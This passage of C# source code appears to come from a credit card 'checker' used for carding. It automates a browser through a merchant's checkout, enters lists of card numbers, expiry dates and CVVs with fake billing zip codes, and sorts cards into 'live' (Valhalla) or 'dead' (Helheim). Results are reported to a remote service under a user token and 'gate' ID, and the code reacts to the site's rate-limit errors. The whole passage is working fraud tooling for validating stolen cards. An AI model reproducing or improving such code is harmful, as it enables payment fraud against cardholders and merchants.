                                    listLiveCreditCard += string.Join("|", CreditCards[i].ToArray());
                                    //await Asatru.SetValhalla(UserId, Token, GateId, string.Join("|", CreditCards[i].ToArray()));
                                }
                                else
                                {
                                    listLiveCreditCard = TextBoxValhalla.Text;
                                    listLiveCreditCard += "\r\n" + string.Join("|", CreditCards[i].ToArray());
                                    //await Asatru.SetValhalla(UserId, Token, GateId, string.Join("|", CreditCards[i].ToArray()));
                                }
                                //await ReduceListCreditCards();
                                TextBoxValhalla.Text = listLiveCreditCard;
                                IEnumerable<Task> tasks = new Task[] {
                                    Asatru.SetValhalla(UserId, Token, GateId, string.Join("|", CreditCards[i].ToArray())),
                                    ReduceListCreditCards(),
                                    OChecker.SetLabelGetRunes(),
                                    Block()
                                };
                                await Task.WhenAll(tasks); // good
                                x += CalcIncrementX(40);
                                //double progress = Convert.ToDouble((x + 1) * 100 / creditCardsCount);
                                await ConsoleProgressGeneral("Trazando retículas irreticulizables.", (int)Math.Round(x));
                                //await Task.Delay(50);
                                //x++;
                                return false;
                            }
                            else
                            {
                                if (requiredValkyrie)
                                {
                                    return false;
                                }
                                if (!forsetiError)
                                {
                                    await browser.Scroll(0, 100, 100);
                                    await ConsoleProgressDetail(string.Join("|", CreditCards[i].ToArray()), 100);
                                    await browser.Screenshot(number + "HellheimCreditCard");
                                    if (TextBoxHelheim.Text == string.Empty)
                                    {
                                        listDieCreditCard += string.Join("|", CreditCards[i].ToArray());
                                        await Asatru.SetHelheim(UserId, Token, GateId, string.Join("|", CreditCards[i].ToArray()));
                                    }
                                    else
                                    {
                                        listDieCreditCard = TextBoxHelheim.Text;
                                        listDieCreditCard += "\r\n" + string.Join("|", CreditCards[i].ToArray());
                                        await Asatru.SetHelheim(UserId, Token, GateId, string.Join("|", CreditCards[i].ToArray()));
                                    }

                                    await Task.WhenAll(Asatru.SetHelheim(UserId, Token, GateId, string.Join("|", CreditCards[i].ToArray())), ReduceListCreditCards()); //good
                                    TextBoxHelheim.Text = listDieCreditCard;
                                    x += CalcIncrementX(40);
                                    //double progress = Convert.ToDouble((x + 1) * 100 / creditCardsCount);
                                    await ConsoleProgressGeneral("Trazando retículas irreticulizables.", (int)Math.Round(x));
                                    //await Task.Delay(50);
                                    //x++;
                                    continue;
                                }
                                else
                                {
                                    forsetiError = false;
                                    return false;
                                }


                            }
                        }
                    }
                }
            }
            catch (Exception) { }

            if (CreditCards.Count() > 0)
            {
                await ConsoleProgressGeneral("Atenuando discontinuidades temporales. ¡Fallo!", 60, "fail");
                return false;
            }
            return true;
        }

        private async Task<bool> Card(string number, string month, string year, string cvv)
        {
            try
            {
                await browser.Screenshot("8.Card");
                await ConsoleProgressDetail("Poniendo lo que pone.", 80);
                await browser.DisableAlerts();
                await browser.ClickXY(0, 0);
                //await browser.Scroll(0);
                //await Task.Delay(5000);

                if (firstTime)
                {
                    await browser.ClickXY(347, 314);
                    await browser.SendKeys(string.Empty, firstName + " " + lastName);
                    //await Task.Delay(100);
                    await browser.SendKeyCode(0x09);
                    await browser.SendKeys(string.Empty, number);
                    //await Task.Delay(100);
                    await browser.SendKeyCode(0x09);
                    await browser.SendKeys(string.Empty, month);
                    //await Task.Delay(100);
                    await browser.SendKeyCode(0x09);
                    await browser.SendKeys(string.Empty, year);
                    //await Task.Delay(100);
                    await browser.SendKeyCode(0x09);
                    await browser.SendKeys(string.Empty, cvv);
                    //await Task.Delay(100);
                    await browser.SendKeyCode(0x09);
                    //await Task.Delay(100);
                    await browser.SendKeyCode(0x09);
                    await browser.SendKeys(string.Empty, Faker.Address.ZipCode("#####"));
                    //await Task.Delay(100);
                    await browser.SendKeyCode(0x09);
                    await browser.SendKeyCode(0x0D);
                    firstTime = false;
                }
                else
                {
                    await browser.ClickXY(347, 487);
                    //await Task.Delay(100);
                    await browser.SendKeyCode(0x09);
                    await browser.SendKeys(string.Empty, number);
                    //await Task.Delay(100);
                    await browser.SendKeyCode(0x09);
                    await browser.SendKeys(string.Empty, "-");
                    await Task.Delay(1000);
                    await browser.SendKeys(string.Empty, month);
                    //await Task.Delay(100);
                    await browser.SendKeyCode(0x09);
                    await browser.SendKeys(string.Empty, "-");
                    await Task.Delay(1000);
                    await browser.SendKeys(string.Empty, year);
                    //await Task.Delay(100);
                    await browser.SendKeyCode(0x09);
                    await browser.SendKeys(string.Empty, cvv);
                    //await Task.Delay(100);
                    await browser.SendKeyCode(0x09);
                    //await Task.Delay(100);
                    await browser.SendKeyCode(0x09);
                    //await Task.Delay(100);
                    await browser.SendKeyCode(0x09);
                    await browser.SendKeyCode(0x0D);
                }
            //    await Task.Delay(5000);
                return true;
            }
            catch (Exception) { }

            await ConsoleProgressDetail("Poniendo lo que pone. ¡Fallo!", 80, "fail");
            return false;
        }

        private async Task<bool> Forseti()
        {
            try
            {
                await browser.Screenshot("9.Forseti");
                await ConsoleProgressDetail("Insuflando furia subatómica.", 90);
                await browser.DisableAlerts();
                string urlIframeScript = "document.querySelector('#z_hppm_iframe').getAttribute('src')";
                string urlIframe = (string)await browser.ExecuteScript(urlIframeScript);
                IFrame iframe = await browser.GetFrameByUrl(urlIframe, "9.ExceptionForseti", 5);

                if (await iframe.FrameElementVisible("#error"))
                {
                    //ar text = (string)await iframe.FExecuteScript("document.querySelector('#error').textContent;", true);
                    //MessageBox.Show(text);
                    if (await iframe.FElementInnerTextContent("#error", "Too many"))
                    {
                        requiredValkyrie = true;
                        return false;
                    }
                }

                if (await browser.ElementVisible("#main-app > div > main > div > div > div.cart-payment__contents > div.cart-payment__left-wrap > div.cart-payment__wrapper > div.error-message.cart-billing__error-message > span:nth-child(1)", "9.1.ExceptionHellheimForseti"))
                {
                    bool hellheim = await browser.ElementInnerTextContent("#main-app > div > main > div > div > div.cart-payment__contents > div.cart-payment__left-wrap > div.cart-payment__wrapper > div.error-message.cart-billing__error-message > span:nth-child(1)", "error 102", "9.1.ExceptionHellheimForsetiTextContet");
                    if (hellheim)
                    {
                        return false;
                    }
                }
                else
                {
                    if (await browser.ElementInnerTextContent("#main-app > div > main > div > div > div > div > h2", "Confirmation", "9.2.ExceptionValhallaForseti"))
                    {
                        bool valhalla = await browser.ElementInnerTextContent("#main-app > div > main > div > div > div > div > h2", "Confirmation", "9.2.ExceptionValhallaForsetiTextContent");
                        if (valhalla)
                        {
                            return true;
                        }
                    }
                }
            }
            catch (Exception) { }
            await ConsoleProgressDetail("Insuflando furia subatómica. ¡Fallo!", 90, "Fail");
            forsetiError = true;
            return false;
        }

        private async Task ReduceListCreditCards()
        {
            try
            {
                CreditCards.RemoveAt(0);
                string listCreditCard = string.Empty;
                int creditCardsCount = CreditCards.Count;
                for (int y = 0; y < creditCardsCount; y++)
                {
                    if (CreditCards.Count > 0)
                    {
                        if (y < CreditCards.Count - 1)
                        {
                            listCreditCard += string.Join("|", CreditCards[y].ToArray()) + "\r\n";
                        }
                        else
                        {
                            listCreditCard += string.Join("|", CreditCards[y].ToArray());
                        }
                    }
                    else
                    {
                        listCreditCard = string.Empty;
                    }
                    //await Task.Delay(50);
                }
                TextBoxCreditCards.Text = listCreditCard;
            }

            catch (Exception) {/* throw; */}
        }

        private double CalcIncrementX(double value)
        {
            try
            {
                double x = value / OriginalCreditCardsCount;
                return x;
            }
            catch (Exception) { }
            return 0;
        }
        #endregion

        private void IconButtonCancel_Click(object sender, EventArgs e)
        {
            PanelConfirm.Hide();
        }

        private void IconButtonConfirmClose_Click(object sender, EventArgs e)
        {
            PanelConfirm.Hide();
        }

        private async Task Block()
        {
            bool block = await Asatru.BlockAesir(UserId, 4, Token);
            if (block)
            {
                PanelBlockGate.Show();
                await IconButtonBlockGateClose.OnClickAsync();
                Owner.HideIconActive("thor");
                PanelBlockGate.Hide();
                if (browser != null)
                {
                    await browser.Kill("www.gaia.com");
                }
                this.Close();
            }
        }
    }
}
